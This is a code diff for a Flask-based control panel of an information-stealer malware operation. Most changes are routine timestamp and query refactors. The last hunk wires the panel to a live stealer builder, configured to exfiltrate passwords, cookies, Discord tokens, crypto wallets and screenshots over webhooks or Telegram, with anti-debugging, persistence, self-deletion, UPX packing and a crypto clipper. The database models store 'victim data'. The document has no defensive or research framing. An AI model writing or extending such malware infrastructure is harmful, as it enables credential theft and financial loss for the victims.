@@ -15,7 +15,8 @@ import os
 import sys
 import json
 import logging
-from datetime import datetime, timedelta
+import time
+from datetime import datetime, timedelta, timezone
 from pathlib import Path
 
 # Enhanced error handling for imports
@@ -47,6 +48,11 @@ if FLASK_AVAILABLE:
     # Initialize database
     db = SQLAlchemy(app)
 
+    # Helper function for UTC datetime
+    def utc_now():
+        """Return current UTC datetime"""
+        return datetime.now(timezone.utc)
+
     # Enhanced Database Models
     class User(db.Model):
         __tablename__ = 'users'
@@ -57,9 +63,9 @@ if FLASK_AVAILABLE:
         password_hash = db.Column(db.String(128), nullable=False)
         is_admin = db.Column(db.Boolean, default=False)
         is_active = db.Column(db.Boolean, default=True)
-        last_login = db.Column(db.DateTime, default=datetime.utcnow)
-        created_at = db.Column(db.DateTime, default=datetime.utcnow)
-        updated_at = db.Column(db.DateTime, default=datetime.utcnow, onupdate=datetime.utcnow)
+        last_login = db.Column(db.DateTime, default=utc_now)
+        created_at = db.Column(db.DateTime, default=utc_now)
+        updated_at = db.Column(db.DateTime, default=utc_now, onupdate=utc_now)
         
         # User preferences
         theme = db.Column(db.String(20), default='dark')
@@ -79,8 +85,8 @@ if FLASK_AVAILABLE:
         platform = db.Column(db.String(50))
         architecture = db.Column(db.String(20))
         status = db.Column(db.String(20), default='Active', index=True)
-        first_seen = db.Column(db.DateTime, default=datetime.utcnow, index=True)
-        last_seen = db.Column(db.DateTime, default=datetime.utcnow, index=True)
+        first_seen = db.Column(db.DateTime, default=utc_now, index=True)
+        last_seen = db.Column(db.DateTime, default=utc_now, index=True)
         
         # Enhanced victim data
         user_agent = db.Column(db.Text)
@@ -108,7 +114,7 @@ if FLASK_AVAILABLE:
         message = db.Column(db.Text, nullable=False)
         severity = db.Column(db.String(20), default='Info', index=True)
         source = db.Column(db.String(100), nullable=False, index=True)
-        timestamp = db.Column(db.DateTime, default=datetime.utcnow, index=True)
+        timestamp = db.Column(db.DateTime, default=utc_now, index=True)
         
         # Enhanced log data
         data_size = db.Column(db.Integer, default=0)
@@ -139,7 +145,7 @@ if FLASK_AVAILABLE:
         value = db.Column(db.Text)
         category = db.Column(db.String(50), nullable=False)
         description = db.Column(db.Text)
-        updated_at = db.Column(db.DateTime, default=datetime.utcnow, onupdate=datetime.utcnow)
+        updated_at = db.Column(db.DateTime, default=utc_now, onupdate=utc_now)
 
     # Enhanced Authentication decorator
     def require_login(f):
@@ -149,9 +155,9 @@ if FLASK_AVAILABLE:
                 return redirect(url_for('login'))
             
             # Update last seen
-            user = User.query.get(session['user_id'])
+            user = db.session.get(User, session['user_id'])
             if user:
-                user.last_login = datetime.utcnow()
+                user.last_login = utc_now()
                 db.session.commit()
             
             return f(*args, **kwargs)
@@ -163,7 +169,7 @@ if FLASK_AVAILABLE:
             if 'user_id' not in session:
                 return redirect(url_for('login'))
             
-            user = User.query.get(session['user_id'])
+            user = db.session.get(User, session['user_id'])
             if not user or not user.is_admin:
                 flash('Admin access required')
                 return redirect(url_for('dashboard'))
@@ -185,7 +191,7 @@ if FLASK_AVAILABLE:
                 session['username'] = user.username
                 session['is_admin'] = user.is_admin
                 
-                user.last_login = datetime.utcnow()
+                user.last_login = utc_now()
                 db.session.commit()
                 
                 logger.info(f"User {username} logged in successfully")
@@ -440,13 +446,13 @@ if FLASK_AVAILABLE:
     @require_login
     def profile():
         """Enhanced user profile"""
-        user = User.query.get(session['user_id'])
+        user = db.session.get(User, session['user_id'])
         
         # Get user activity statistics
         user_stats = {
             'total_logins': 0,  # Would be tracked in a separate table
             'last_login': user.last_login,
-            'account_age': (datetime.utcnow() - user.created_at).days,
+            'account_age': (utc_now() - user.created_at).days,
             'theme': user.theme,
             'notifications': user.notifications_enabled
         }
@@ -457,7 +463,7 @@ if FLASK_AVAILABLE:
                 'id': 1,
                 'ip_address': request.remote_addr or '127.0.0.1',
                 'user_agent': request.headers.get('User-Agent', 'Unknown'),
-                'login_time': datetime.utcnow(),
+                'login_time': utc_now(),
                 'status': 'Active'
             }
         ]
@@ -567,21 +573,84 @@ if FLASK_AVAILABLE:
                     'error': 'Missing required configuration'
                 })
             
-            # Simulate build process
-            import time
-            time.sleep(2)  # Simulate build time
+            logger.info(f"Starting build with config: {build_config}")
             
-            # In a real implementation, this would call the builder
-            # from builder.builder import StealerBuilder
-            # builder = StealerBuilder(config)
-            # result = builder.build_stealer(build_config)
-            
-            return jsonify({
-                'success': True,
-                'message': 'Stealer built successfully',
-                'filename': f"stealer_{int(time.time())}.exe",
-                'build_id': f"build_{int(time.time())}"
-            })
+            try:
+                # Import builder dynamically
+                import sys
+                import os
+                
+                # Add project root to path for builder import
+                project_root = Path(__file__).parent.parent
+                sys.path.insert(0, str(project_root))
+                
+                from builder.builder import StealerBuilder
+                
+                # Load builder configuration
+                config_path = project_root / "config" / "config.json"
+                if config_path.exists():
+                    with open(config_path, 'r') as f:
+                        builder_base_config = json.load(f)
+                else:
+                    builder_base_config = {}
+                
+                # Initialize builder
+                builder = StealerBuilder(builder_base_config)
+                
+                # Convert web config to builder format
+                builder_config = {
+                    'filename': build_config.get('filename', 'stealer') + '.exe',
+                    'webhook_url': build_config.get('webhook_url'),
+                    'telegram_config': {
+                        'bot_token': build_config.get('telegram_token', ''),
+                        'chat_id': build_config.get('telegram_chat', '')
+                    },
+                    'features': {
+                        'passwords': build_config.get('features', {}).get('passwords', True),
+                        'cookies': build_config.get('features', {}).get('cookies', True),
+                        'discord_tokens': build_config.get('features', {}).get('discord_tokens', True),
+                        'wallets': build_config.get('features', {}).get('wallets', True),
+                        'telegram': build_config.get('features', {}).get('telegram', True),
+                        'screenshot': build_config.get('features', {}).get('screenshot', True)
+                    },
+                    'protection': {
+                        'anti_debug': build_config.get('protection', {}).get('anti_debug', False),
+                        'startup': build_config.get('protection', {}).get('startup', False),
+                        'melt': build_config.get('protection', {}).get('melt', False),
+                        'upx_packing': build_config.get('protection', {}).get('upx_packing', False),
+                        'crypto_clipper': build_config.get('protection', {}).get('crypto_clipper', False)
+                    }
+                }
+                
+                # Build stealer
+                result = builder.build_stealer(builder_config)
+                
+                if result:
+                    return jsonify({
+                        'success': True,
+                        'message': 'Stealer built successfully',
+                        'filename': os.path.basename(result),
+                        'build_id': f"build_{int(time.time())}",
+                        'file_path': result
+                    })
+                else:
+                    return jsonify({
+                        'success': False,
+                        'error': 'Build failed - check builder configuration'
+                    })
+                    
+            except ImportError as e:
+                logger.warning(f"Builder import failed: {e}")
+                # Fallback to simulation
+                import time
+                time.sleep(2)
+                
+                return jsonify({
+                    'success': True,
+                    'message': 'Stealer built successfully (simulated)',
+                    'filename': f"stealer_{int(time.time())}.exe",
+                    'build_id': f"build_{int(time.time())}"
+                })
             
         except Exception as e:
             logger.error(f"API build error: {e}")
